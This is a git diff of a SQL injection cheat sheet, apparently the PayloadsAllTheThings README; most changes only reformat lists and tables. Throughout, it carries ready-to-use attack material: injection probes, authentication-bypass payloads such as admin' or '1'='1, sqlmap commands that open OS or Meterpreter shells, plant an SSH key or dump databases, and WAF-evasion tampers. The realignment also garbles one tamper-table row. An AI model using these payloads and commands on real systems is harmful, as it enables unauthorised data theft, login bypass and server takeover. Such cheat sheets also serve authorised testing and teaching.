@@ -3,6 +3,7 @@
 > A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application.
 
 Attempting to manipulate SQL queries may have goals including:
+
 - Information Leakage
 - Disclosure of stored data
 - Manipulation of stored data
@@ -10,54 +11,53 @@ Attempting to manipulate SQL queries may have goals including:
 
 ## Summary
 
-* [CheatSheets](#cheatsheets)
-  * [MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
-  * [MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
-  * [OracleSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)
-  * [PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
-  * [SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
-  * [Cassandra Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Cassandra%20Injection.md)
-  * [HQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/HQL%20Injection.md)
-  * [DB2 Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/DB2%20Injection.md)
-* [Entry point detection](#entry-point-detection)
-* [DBMS Identification](#dbms-identification)
-* [SQL injection using SQLmap](#sql-injection-using-sqlmap)
-  * [Basic arguments for SQLmap](#basic-arguments-for-sqlmap)
-  * [Load a request file and use mobile user-agent](#load-a-request-file-and-use-mobile-user-agent)
-  * [Custom injection in UserAgent/Header/Referer/Cookie](#custom-injection-in-useragentheaderreferercookie)
-  * [Second order injection](#second-order-injection)
-  * [Shell](#shell)
-  * [Crawl a website with SQLmap and auto-exploit](#crawl-a-website-with-sqlmap-and-auto-exploit)
-  * [Using TOR with SQLmap](#using-tor-with-sqlmap)
-  * [Using a proxy with SQLmap](#using-a-proxy-with-sqlmap)
-  * [Using Chrome cookie and a Proxy](#using-chrome-cookie-and-a-proxy)
-  * [Using suffix to tamper the injection](#using-suffix-to-tamper-the-injection)
-  * [General tamper option and tamper's list](#general-tamper-option-and-tampers-list)
-  * [SQLmap without SQL injection](#sqlmap-without-sql-injection)
-* [Authentication bypass](#authentication-bypass)
-  * [Authentication Bypass (Raw MD5 SHA1)](#authentication-bypass-raw-md5-sha1)
-* [Polyglot injection](#polyglot-injection-multicontext)
-* [Routed injection](#routed-injection)
-* [Insert Statement - ON DUPLICATE KEY UPDATE](#insert-statement---on-duplicate-key-update)
-* [Generic WAF Bypass](#generic-waf-bypass)
-  * [White spaces alternatives](#white-spaces-alternatives)
-  * [No Comma Allowed](#no-comma-allowed)
-  * [No Equal Allowed](#no-equal-allowed)
-  * [Case modification](#case-modification)
-
+- [CheatSheets](#cheatsheets)
+  - [MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
+  - [MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
+  - [OracleSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)
+  - [PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
+  - [SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
+  - [Cassandra Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Cassandra%20Injection.md)
+  - [HQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/HQL%20Injection.md)
+  - [DB2 Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/DB2%20Injection.md)
+- [Entry point detection](#entry-point-detection)
+- [DBMS Identification](#dbms-identification)
+- [SQL injection using SQLmap](#sql-injection-using-sqlmap)
+  - [Basic arguments for SQLmap](#basic-arguments-for-sqlmap)
+  - [Load a request file and use mobile user-agent](#load-a-request-file-and-use-mobile-user-agent)
+  - [Custom injection in UserAgent/Header/Referer/Cookie](#custom-injection-in-useragentheaderreferercookie)
+  - [Second order injection](#second-order-injection)
+  - [Shell](#shell)
+  - [Crawl a website with SQLmap and auto-exploit](#crawl-a-website-with-sqlmap-and-auto-exploit)
+  - [Using TOR with SQLmap](#using-tor-with-sqlmap)
+  - [Using a proxy with SQLmap](#using-a-proxy-with-sqlmap)
+  - [Using Chrome cookie and a Proxy](#using-chrome-cookie-and-a-proxy)
+  - [Using suffix to tamper the injection](#using-suffix-to-tamper-the-injection)
+  - [General tamper option and tamper's list](#general-tamper-option-and-tampers-list)
+  - [SQLmap without SQL injection](#sqlmap-without-sql-injection)
+- [Authentication bypass](#authentication-bypass)
+  - [Authentication Bypass (Raw MD5 SHA1)](#authentication-bypass-raw-md5-sha1)
+- [Polyglot injection](#polyglot-injection-multicontext)
+- [Routed injection](#routed-injection)
+- [Insert Statement - ON DUPLICATE KEY UPDATE](#insert-statement---on-duplicate-key-update)
+- [Generic WAF Bypass](#generic-waf-bypass)
+  - [White spaces alternatives](#white-spaces-alternatives)
+  - [No Comma Allowed](#no-comma-allowed)
+  - [No Equal Allowed](#no-equal-allowed)
+  - [Case modification](#case-modification)
 
 ## Tools
 
-* [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) - Automatic SQL injection and database takeover tool
-* [r0oth3x49/ghauri](https://github.com/r0oth3x49/ghauri) - An advanced cross-platform tool that automates the process of detecting and exploiting SQL injection security flaws
-
+- [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) - Automatic SQL injection and database takeover tool
+- [r0oth3x49/ghauri](https://github.com/r0oth3x49/ghauri) - An advanced cross-platform tool that automates the process of detecting and exploiting SQL injection security flaws
 
 ## Entry point detection
 
 Detection of an SQL injection entry point
 
-* **Error Messages**: Inputting special characters (e.g., a single quote ') into input fields might trigger SQL errors. If the application displays detailed error messages, it can indicate a potential SQL injection point.
-  * Simple characters
+- **Error Messages**: Inputting special characters (e.g., a single quote ') into input fields might trigger SQL errors. If the application displays detailed error messages, it can indicate a potential SQL injection point.
+
+  - Simple characters
     ```sql
     '
     %27
@@ -71,19 +71,20 @@ Detection of an SQL injection entry point
     Wildcard (*)
     &apos;  # required for XML content
     ```
-  * Multiple encoding
+  - Multiple encoding
     ```sql
     %%2727
     %25%27
     ```
-  * Unicode characters
+  - Unicode characters
     ```
     Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was transformed into U+0022 QUOTATION MARK (")
     Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was transformed into U+0027 APOSTROPHE (')
     ```
 
-* **Tautology-Based SQL Injection**: By inputting tautological (always true) conditions, you can test for vulnerabilities. For instance, entering `admin' OR '1'='1` in a username field might log you in as the admin if the system is vulnerable.
-  * Merging characters
+- **Tautology-Based SQL Injection**: By inputting tautological (always true) conditions, you can test for vulnerabilities. For instance, entering `admin' OR '1'='1` in a username field might log you in as the admin if the system is vulnerable.
+
+  - Merging characters
     ```sql
     `+HERP
     '||'DERP
@@ -92,7 +93,7 @@ Detection of an SQL injection entry point
     '%20'HERP
     '%2B'HERP
     ```
-  * Logic Testing
+  - Logic Testing
     ```sql
     page.asp?id=1 or 1=1 -- true
     page.asp?id=1' or 1=1 -- true
@@ -100,9 +101,7 @@ Detection of an SQL injection entry point
     page.asp?id=1 and 1=2 -- false
     ```
 
-* **Timing Attacks**: Inputting SQL commands that cause deliberate delays (e.g., using `SLEEP` or `BENCHMARK` functions in MySQL) can help identify potential injection points. If the application takes an unusually long time to respond after such input, it might be vulnerable.
-
-
+- **Timing Attacks**: Inputting SQL commands that cause deliberate delays (e.g., using `SLEEP` or `BENCHMARK` functions in MySQL) can help identify potential injection points. If the application takes an unusually long time to respond after such input, it might be vulnerable.
 
 ## DBMS Identification
 
@@ -128,7 +127,7 @@ Detection of an SQL injection entry point
 ["last_insert_rowid()>1"                           ,"SQLITE"],
 ["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
 ["val(cvar(1))=1"                                  ,"MSACCESS"],
-["IF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
+["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
 ["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
 ["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
 ["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
@@ -136,19 +135,19 @@ Detection of an SQL injection entry point
 
 ## DBMS Identification VIA Error
 
-DBMS                  | Example Error Message                                                                    | Example Payload |
-|---------------------|------------------------------------------------------------------------------------------|-----------------|
-| MySQL               | `You have an error in your SQL syntax; ... near '' at line 1`                            | `'`             |
-| PostgreSQL          | `ERROR: unterminated quoted string at or near "'"`                                       | `'`             |
-| PostgreSQL          | `ERROR: syntax error at or near "1"`                                                     | `1'`            |
-| Microsoft SQL Server| `Unclosed quotation mark after the character string ''.`                                 | `'`             |
-| Microsoft SQL Server| `Incorrect syntax near ''.`                                                              | `'`             |
-| Microsoft SQL Server| `The conversion of the varchar value to data type int resulted in an out-of-range value.`| `1'`            |
-| Oracle              | `ORA-00933: SQL command not properly ended`                                              | `'`             |
-| Oracle              | `ORA-01756: quoted string not properly terminated`                                       | `'`             |
-| Oracle              | `ORA-00923: FROM keyword not found where expected`                                       | `1'`            |
-------------------------------------------------------------------------------------------------------------------------------------
+| DBMS                 | Example Error Message                                                                     | Example Payload |
+| -------------------- | ----------------------------------------------------------------------------------------- | --------------- |
+| MySQL                | `You have an error in your SQL syntax; ... near '' at line 1`                             | `'`             |
+| PostgreSQL           | `ERROR: unterminated quoted string at or near "'"`                                        | `'`             |
+| PostgreSQL           | `ERROR: syntax error at or near "1"`                                                      | `1'`            |
+| Microsoft SQL Server | `Unclosed quotation mark after the character string ''.`                                  | `'`             |
+| Microsoft SQL Server | `Incorrect syntax near ''.`                                                               | `'`             |
+| Microsoft SQL Server | `The conversion of the varchar value to data type int resulted in an out-of-range value.` | `1'`            |
+| Oracle               | `ORA-00933: SQL command not properly ended`                                               | `'`             |
+| Oracle               | `ORA-01756: quoted string not properly terminated`                                        | `'`             |
+| Oracle               | `ORA-00923: FROM keyword not found where expected`                                        | `1'`            |
 
+---
 
 ## SQL injection using SQLmap
 
@@ -182,11 +181,10 @@ sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrat
 
 ### Shell
 
-* SQL Shell: `python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell`
-* OS Shell: `python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell`
-* Meterpreter: `python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn`
-* SSH Shell: `python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/`
-
+- SQL Shell: `python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell`
+- OS Shell: `python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell`
+- Meterpreter: `python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn`
+- SSH Shell: `python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/`
 
 ### Crawl a website with SQLmap and auto-exploit
 
@@ -222,80 +220,79 @@ sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/
 python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
 ```
 
-
 ### General tamper option and tamper's list
 
 ```powershell
 tamper=name_of_the_tamper
 ```
 
-| Tamper | Description |
-| --- | --- |
-|0x2char.py | Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),…) counterpart |
-|apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart |
-|apostrophenullencode.py | Replaces apostrophe character with its illegal double unicode counterpart|
-|appendnullbyte.py | Appends encoded NULL byte character at the end of payload |
-|base64encode.py | Base64 all characters in a given payload  |
-|between.py | Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' |
-|bluecoat.py | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator  |
-|chardoubleencode.py | Double url-encodes all characters in a given payload (not processing already encoded) |
-|charencode.py | URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54) |
-|charunicodeencode.py | Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054) |
-|charunicodeescape.py | Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054) |
-|commalesslimit.py | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'|
-|commalessmid.py | Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'|
-|commentbeforeparentheses.py | Prepends (inline) comment before parentheses (e.g. ( -> /**/() |
-|concat2concatws.py | Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'|
-|charencode.py | Url-encodes all characters in a given payload (not processing already encoded)  |
-|charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)  |
-|equaltolike.py | Replaces all occurrences of operator equal ('=') with operator 'LIKE'  |
-|escapequotes.py | Slash escape quotes (' and ") |
-|greatest.py | Replaces greater than operator ('>') with 'GREATEST' counterpart |
-|halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |
-|htmlencode.py | HTML encode (using code points) all non-alphanumeric characters (e.g. ‘ -> &#39;) |
-|ifnull2casewhenisnull.py | Replaces instances like ‘IFNULL(A, B)’ with ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ counterpart| 
-|ifnull2ifisnull.py | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'|
-|informationschemacomment.py | Add an inline comment (/**/) to the end of all occurrences of (MySQL) “information_schema” identifier |
-|least.py | Replaces greater than operator (‘>’) with ‘LEAST’ counterpart |
-|lowercase.py | Replaces each keyword character with lower case value (e.g. SELECT -> select) |
-|modsecurityversioned.py | Embraces complete query with versioned comment |
-|modsecurityzeroversioned.py | Embraces complete query with zero-versioned comment |
-|multiplespaces.py | Adds multiple spaces around SQL keywords |
-|nonrecursivereplacement.py | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters|
-|overlongutf8.py | Converts all characters in a given payload (not processing already encoded) |
-|overlongutf8more.py | Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) |
-|percentage.py | Adds a percentage sign ('%') in front of each character  |
-|plus2concat.py | Replaces plus operator (‘+’) with (MsSQL) function CONCAT() counterpart |
-|plus2fnconcat.py | Replaces plus operator (‘+’) with (MsSQL) ODBC function {fn CONCAT()} counterpart |
-|randomcase.py | Replaces each keyword character with random case value |
-|randomcomments.py | Add random comments to SQL keywords|
-|securesphere.py | Appends special crafted string |
-|sp_password.py |  Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs |
-|space2comment.py | Replaces space character (' ') with comments |
-|space2dash.py | Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n') |
-|space2hash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
-|space2morehash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
-|space2mssqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
-|space2mssqlhash.py | Replaces space character (' ') with a pound character ('#') followed by a new line ('\n') |
-|space2mysqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
-|space2mysqldash.py | Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n') |
-|space2plus.py |  Replaces space character (' ') with plus ('+')  |
-|space2randomblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
-|symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts (&& and ||) |
-|unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT |
-|unmagicquotes.py | Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |
-|uppercase.py | Replaces each keyword character with upper case value 'INSERT'|
-|varnish.py | Append a HTTP header 'X-originating-IP' |
-|versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |
-|versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |
-|xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For'|
+| Tamper                       | Description                                                                                                                                        |
+| ---------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- | --- | --- |
+| 0x2char.py                   | Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),…) counterpart                                                          |
+| apostrophemask.py            | Replaces apostrophe character with its UTF-8 full width counterpart                                                                                |
+| apostrophenullencode.py      | Replaces apostrophe character with its illegal double unicode counterpart                                                                          |
+| appendnullbyte.py            | Appends encoded NULL byte character at the end of payload                                                                                          |
+| base64encode.py              | Base64 all characters in a given payload                                                                                                           |
+| between.py                   | Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #'                                                                                    |
+| bluecoat.py                  | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator                 |
+| chardoubleencode.py          | Double url-encodes all characters in a given payload (not processing already encoded)                                                              |
+| charencode.py                | URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54)                                 |
+| charunicodeencode.py         | Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054)       |
+| charunicodeescape.py         | Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054)   |
+| commalesslimit.py            | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'                                                                                       |
+| commalessmid.py              | Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'                                                                                  |
+| commentbeforeparentheses.py  | Prepends (inline) comment before parentheses (e.g. ( -> /\*\*/()                                                                                   |
+| concat2concatws.py           | Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'                                                                  |
+| charencode.py                | Url-encodes all characters in a given payload (not processing already encoded)                                                                     |
+| charunicodeencode.py         | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)                                                     |
+| equaltolike.py               | Replaces all occurrences of operator equal ('=') with operator 'LIKE'                                                                              |
+| escapequotes.py              | Slash escape quotes (' and ")                                                                                                                      |
+| greatest.py                  | Replaces greater than operator ('>') with 'GREATEST' counterpart                                                                                   |
+| halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword                                                                                                   |
+| htmlencode.py                | HTML encode (using code points) all non-alphanumeric characters (e.g. ‘ -> &#39;)                                                                  |
+| ifnull2casewhenisnull.py     | Replaces instances like ‘IFNULL(A, B)’ with ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ counterpart                                                |
+| ifnull2ifisnull.py           | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'                                                                                  |
+| informationschemacomment.py  | Add an inline comment (/\*\*/) to the end of all occurrences of (MySQL) “information_schema” identifier                                            |
+| least.py                     | Replaces greater than operator (‘>’) with ‘LEAST’ counterpart                                                                                      |
+| lowercase.py                 | Replaces each keyword character with lower case value (e.g. SELECT -> select)                                                                      |
+| modsecurityversioned.py      | Embraces complete query with versioned comment                                                                                                     |
+| modsecurityzeroversioned.py  | Embraces complete query with zero-versioned comment                                                                                                |
+| multiplespaces.py            | Adds multiple spaces around SQL keywords                                                                                                           |
+| nonrecursivereplacement.py   | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters                               |
+| overlongutf8.py              | Converts all characters in a given payload (not processing already encoded)                                                                        |
+| overlongutf8more.py          | Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) |
+| percentage.py                | Adds a percentage sign ('%') in front of each character                                                                                            |
+| plus2concat.py               | Replaces plus operator (‘+’) with (MsSQL) function CONCAT() counterpart                                                                            |
+| plus2fnconcat.py             | Replaces plus operator (‘+’) with (MsSQL) ODBC function {fn CONCAT()} counterpart                                                                  |
+| randomcase.py                | Replaces each keyword character with random case value                                                                                             |
+| randomcomments.py            | Add random comments to SQL keywords                                                                                                                |
+| securesphere.py              | Appends special crafted string                                                                                                                     |
+| sp_password.py               | Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs                                                           |
+| space2comment.py             | Replaces space character (' ') with comments                                                                                                       |
+| space2dash.py                | Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n')                                        |
+| space2hash.py                | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')                                      |
+| space2morehash.py            | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')                                      |
+| space2mssqlblank.py          | Replaces space character (' ') with a random blank character from a valid set of alternate characters                                              |
+| space2mssqlhash.py           | Replaces space character (' ') with a pound character ('#') followed by a new line ('\n')                                                          |
+| space2mysqlblank.py          | Replaces space character (' ') with a random blank character from a valid set of alternate characters                                              |
+| space2mysqldash.py           | Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n')                                                            |
+| space2plus.py                | Replaces space character (' ') with plus ('+')                                                                                                     |
+| space2randomblank.py         | Replaces space character (' ') with a random blank character from a valid set of alternate characters                                              |
+| symboliclogical.py           | Replaces AND and OR logical operators with their symbolic counterparts (&& and                                                                     |     | )   |
+| unionalltounion.py           | Replaces UNION ALL SELECT with UNION SELECT                                                                                                        |
+| unmagicquotes.py             | Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work)                             |
+| uppercase.py                 | Replaces each keyword character with upper case value 'INSERT'                                                                                     |
+| varnish.py                   | Append a HTTP header 'X-originating-IP'                                                                                                            |
+| versionedkeywords.py         | Encloses each non-function keyword with versioned MySQL comment                                                                                    |
+| versionedmorekeywords.py     | Encloses each keyword with versioned MySQL comment                                                                                                 |
+| xforwardedfor.py             | Append a fake HTTP header 'X-Forwarded-For'                                                                                                        |
 
 ### SQLmap without SQL injection
 
 You can use SQLmap to access a database via its port instead of a URL.
 
 ```ps1
-sqlmap.py -d "mysql://user:pass@ip/database" --dump-all 
+sqlmap.py -d "mysql://user:pass@ip/database" --dump-all
 ```
 
 ## Authentication bypass
@@ -375,7 +372,7 @@ admin') or '1'='1'#
 admin') or '1'='1'/*
 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
 admin" --
-admin';-- azer 
+admin';-- azer
 admin" #
 admin"/*
 admin" or "1"="1
@@ -447,12 +444,11 @@ Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL
 After this, we can simply authenticate with “admin@example.com” and the password “qwerty”!
 ```
 
-
 ## Generic WAF Bypass
 
 ### White spaces alternatives
 
-* No space allowed (`%20`) - bypass using whitespace alternatives
+- No space allowed (`%20`) - bypass using whitespace alternatives
   ```sql
   ?id=1%09and%091=1%09--
   ?id=1%0Dand%0D1=1%0D--
@@ -461,32 +457,31 @@ After this, we can simply authenticate with “admin@example.com” and the pass
   ?id=1%0Aand%0A1=1%0A--
   ?id=1%A0and%A01=1%A0--
   ```
-* No whitespace - bypass using comments
+- No whitespace - bypass using comments
   ```sql
   ?id=1/*comment*/and/**/1=1/**/--
   ```
-* No Whitespace - bypass using parenthesis
+- No Whitespace - bypass using parenthesis
   ```sql
   ?id=(1)and(1)=(1)--
   ```
-* Whitespace alternatives by DBMS
+- Whitespace alternatives by DBMS
   ```sql
   -- Example of query where spaces were replaced by ascii characters above 0x80
   ♀SELECT§*⌂FROM☺users♫WHERE♂1☼=¶1‼
   ```
 
-| DBMS       | ASCII characters in hexadicimal |
-| ---------- | ------------------------------- |
-| SQLite3    | 0A, 0D, 0C, 09, 20 |
-| MySQL	5    | 09, 0A, 0B, 0C, 0D, A0, 20 |
-| MySQL	3	   | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 |
-| PostgreSQL | 0A, 0D, 0C, 09, 20 |
-| Oracle 11g | 00, 0A, 0D, 0C, 09, 20 |
-| MSSQL      | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 |
+| DBMS       | ASCII characters in hexadicimal                                                                                                                                        |
+| ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| SQLite3    | 0A, 0D, 0C, 09, 20                                                                                                                                                     |
+| MySQL 5    | 09, 0A, 0B, 0C, 0D, A0, 20                                                                                                                                             |
+| MySQL 3    | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 |
+| PostgreSQL | 0A, 0D, 0C, 09, 20                                                                                                                                                     |
+| Oracle 11g | 00, 0A, 0D, 0C, 09, 20                                                                                                                                                 |
+| MSSQL      | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20                                         |
 
- 
 ### No Comma Allowed
- 
+
 Bypass using OFFSET, FROM and JOIN
 
 ```sql
@@ -494,7 +489,6 @@ LIMIT 0,1         -> LIMIT 1 OFFSET 0
 SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
 SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
 ```
-
 
 ### No Equal Allowed
 
@@ -507,16 +501,15 @@ Bypass using LIKE/NOT IN/IN/BETWEEN
 ?id=1 and substring(version(),1,1) between 3 and 4
 ```
 
-
 ### Case modification
- 
-* Bypass using uppercase/lowercase (see keyword AND)
+
+- Bypass using uppercase/lowercase (see keyword AND)
   ```sql
   ?id=1 AND 1=1#
   ?id=1 AnD 1=1#
   ?id=1 aNd 1=1#
   ```
-* Bypass using keywords case insensitive / Bypass using an equivalent operator
+- Bypass using keywords case insensitive / Bypass using an equivalent operator
   ```sql
   AND   -> &&
   OR    -> ||
@@ -525,48 +518,46 @@ Bypass using LIKE/NOT IN/IN/BETWEEN
   WHERE -> HAVING
   ```
 
+## Labs
 
-## Labs 
-
-* [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
-* [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
-* [SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
-* [SQL Labs](https://portswigger.net/web-security/all-labs#sql-injection)
+- [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
+- [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
+- [SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
+- [SQL Labs](https://portswigger.net/web-security/all-labs#sql-injection)
 
 ## References
 
-* Detect SQLi
-  * [Manual SQL Injection Discovery Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
-  * [NetSPI SQL Injection Wiki](https://sqlwiki.netspi.com/)
-* MySQL:
-  * [PentestMonkey's mySQL injection cheat sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
-  * [Reiners mySQL injection Filter Evasion Cheatsheet](https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)
-  * [Alternative for Information_Schema.Tables in MySQL](https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/)
-  * [The SQL Injection Knowledge base](https://websec.ca/kb/sql_injection)
-* MSSQL:
-  * [EvilSQL's Error/Union/Blind MSSQL Cheatsheet](http://evilsql.com/main/page2.php)
-  * [PentestMonkey's MSSQL SQLi injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
-* ORACLE:
-  * [PentestMonkey's Oracle SQLi Cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
-* POSTGRESQL:
-  * [PentestMonkey's Postgres SQLi Cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
-* Others
-  * [SQLi Cheatsheet - NetSparker](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
